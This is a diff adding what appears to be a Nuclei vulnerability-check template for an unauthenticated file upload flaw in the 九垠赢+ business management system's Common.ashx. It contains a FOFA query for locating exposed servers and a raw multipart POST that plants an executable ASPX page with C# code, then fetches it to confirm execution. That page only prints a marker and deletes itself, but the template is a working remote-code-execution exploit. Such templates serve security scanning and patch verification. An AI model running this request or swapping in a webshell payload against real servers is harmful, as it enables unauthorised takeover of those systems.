@@ -1,0 +1,47 @@
+id: jiuyinying-Common_ashx-File-upload
+
+info:
+  name: 九垠赢+商业管理系统 Common.ashx 任意文件上传漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="九垠赢+"
+    九垠赢+商业管理系统 Common.ashx 存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://mp.weixin.qq.com/s/hagcU7qggatYuBGucZTbuQ?token=1497378487&lang=zh_CN
+  tags: File upload
+
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /System/Common.ashx?type=savefile&path={{username}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Accept: */*
+        Connection: close
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="content";
+        Content-Type: text/plain
+        
+        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+      - |
+        GET /System/{{username}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
